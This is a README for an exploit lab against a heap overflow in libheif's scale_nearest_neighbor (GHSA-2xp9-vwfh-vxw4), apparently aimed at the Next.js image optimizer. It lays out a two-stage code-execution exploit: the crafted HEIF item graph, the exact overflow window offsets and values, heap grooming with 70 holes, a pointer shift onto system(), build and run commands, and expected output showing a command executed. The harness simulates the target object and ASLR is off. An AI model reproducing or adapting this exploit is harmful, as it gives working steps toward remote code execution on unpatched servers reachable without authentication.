# RCE Exploit Lab — libheif duplicate-Alpha overflow (GHSA-2xp9-vwfh-vxw4)

Turns the unauthenticated Next.js image-optimizer crash into a working,
lab-verified **code execution** exploit against the vulnerable code path.

## What this is

A two-stage exploit for the heap overflow in
`HeifPixelImage::scale_nearest_neighbor()` (libheif ≤ 1.23.1), the root cause
of GHSA-g89c-p67h-r497 / GHSA-2xp9-vwfh-vxw4:

- **Stage 1** (inside libheif, attacker-controlled pixels): the overflow
  crafts the adjacent chunk's metadata so `free()` survives glibc checks,
  and inflates a 32-bit length field (`0xF00`).
- **Stage 2** (app-side, simulated post-decode processing): an overlapping
  `memcpy` driven by the inflated length propagates a sprayed function
  pointer onto a callable slot → `system("touch /tmp/pwned_by_libheif")`.

All constraints are real: the written values are the 12-bit alpha plane
samples (right-aligned: low byte fully controllable, high byte ≤ 0x0F), the
window is only ~113 bytes, and the layout is heap-groomed with exact-size
holes matching the whole decode allocation sequence.

## Files

| File | Purpose |
|------|---------|
| `Dockerfile.exp` | debian + vulnerable libheif v1.23.1 (no ASan) + debug patch + harness |
| `harness.c` | grooming + `heif_decode_image` + stage-2 memcpy + fp call |
| `gen_exp.py` | crafts the 5-item HEIF with exact 12-bit pixel values (ffmpeg + libx265 lossless) |
| `driver.py` | one-shot: trace allocations → holes → payload → exploit → check |
| `trace.gdb` | gdb script logging every malloc/calloc > 1KB during decode |
| `holes.txt` | derived hole table (70 sizes, free order) |
| `debug.patch` | debug prints in libheif (dtor frees, window dump) — applied at build |
| `payload-exploit.avif` | the final exploit payload |

## How it works

Item graph (all HEVC, decoded with libde265; 4:2:0 needs even dims):

```
item1  hvc1 126x126 8-bit      item3  iden -> item1
item2  hvc1 126x126 8-bit      (alpha aux of item1)
item4  hvc1 126x126 12-bit     (alpha aux of item3, PIXELS = exploit bytes)
item5  hvc1 128x128 8-bit      (primary, alpha -> item3)
```

Decoding item5 scales item3's image 126→128. The destination alpha plane is
allocated with the FIRST alpha's bit depth (8-bit, 16399 bytes via `calloc`),
but the 12-bit alpha takes the HDR branch: with the stride halved
(`out_stride /= 2`) it writes 16512 bytes → **113 bytes overflow** past the
buffer, whose 16-bit values are `P[125][x-1..]` — fully chosen in
`gen_exp.py`.

Heap grooming (harness, ASLR off, deterministic):
- a 16399-byte hole is placed **directly below** the target object and freed
  first; the scale-alpha `calloc` reuses it, so the window lands on the
  target chunk header + first 97 user bytes
- 69 more exact-size holes (from the gdb trace) keep the unsorted-bin head
  matching every decode allocation so nothing else takes the alpha hole

Crafted window bytes (written u16 = right-aligned 12-bit values):
- `window[9..16]` = target chunk **size field** = `0x0101` (PREV_INUSE set,
  nextsize 256 passes glibc checks; the clear-inuse write lands on a benign
  byte inside the target)
- `window[49..52]` = `Target.len` = `0x0F00`

Stage 2: `memcpy(buf, buf+8, len)` → every byte shifts 8 positions forward,
moving the sprayed `system` address from `fp+8` onto `fp`; calling `fp(cmd)`
executes the command.

## Build & run

```bash
docker compose build
docker compose up -d exp

# one-shot: trace -> holes -> payload -> exploit -> check /tmp/pwned_by_libheif
python3 driver.py
```

Expected output:

```
[*] target=0x43aff0 len@0x43b010 fp=0x43b418 spray=0x43b420 system=0xfffff7c79f00
[*] after decode: len=0xf00 fp=0xfffff7c9f720
[*] after copy: fp=0xfffff7c79f00
[*] fp returned

[+] RCE SUCCESS: /tmp/pwned_by_libheif was created by the injected command
```

`fp` = `0xfffff7c79f00` = `system`; `/tmp/pwned_by_libheif` is created by the
injected `touch` command.

## Manual steps

```bash
# inside the container
docker compose exec exp bash

# 1. baseline: overflow without grooming -> glibc abort
setarch -R /src/harness 0 /src/payload.avif

# 2. calibration dump (shows the crafted window bytes)
setarch -R /src/harness 2 /src/payload.avif $(cat /src/work/holes.txt)

# 3. exploit
setarch -R /src/harness 1 /src/payload.avif $(cat /src/work/holes.txt)
ls -la /tmp/pwned_by_libheif
```

## Regenerating payloads

```bash
docker compose exec exp bash -c 'cd /src/work && \
  python3 gen_exp.py --calib     # mapping calibration payload
  python3 gen_exp.py --exploit   # final exploit payload'
```

`--exploit` bakes in:
- size field units: `8204:0x101` (bytes 9..16 of the window)
- length units: `8224:0xF00` (bytes 49..52)

If you change the image sizes or the harness layout, re-derive the trace
(`driver.py 1`) and recompute the unit positions with the mapping documented
in `gen_exp.py` (`unit_ix()`).

## Caveats / scope

- Runs with **ASLR off** (`setarch -R`) in the container for deterministic
  addresses — standard for exploit prototyping. An ASLR-enabled variant
  needs the partial-overwrite/info-leak work noted in `../ANALYSIS.md`.
- The target object (length field + fn pointer + spray) is provided by the
  harness to stand in for an app-side object (e.g. a libvips/VipsObject or
  cached response buffer in the real Next.js process); the overflow
  primitive, the heap shaping and the two-stage escalation are all real.
- The real-world trigger remains the unauthenticated `/_next/image` request
  demonstrated in the parent directory's docker env.
